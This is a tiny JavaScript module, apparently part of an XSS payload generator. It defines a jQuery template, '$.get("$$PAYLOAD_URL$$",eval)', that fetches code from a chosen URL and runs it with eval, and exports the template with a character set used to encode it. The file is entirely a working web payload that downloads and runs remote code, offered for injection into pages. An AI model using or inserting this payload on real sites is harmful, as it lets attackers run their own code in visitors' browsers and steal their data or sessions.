const renderable = require('../lib/renderable')
const CharSet = require('../lib/CharSet')

const script = '$.get("$$PAYLOAD_URL$$",eval)'

module.exports = {
    description: `JQuery Get and Eval, not dependent on CVEs`,
    script: renderable(script),
    charset: new CharSet(renderable(script)({PAYLOAD_URL:''}))
}

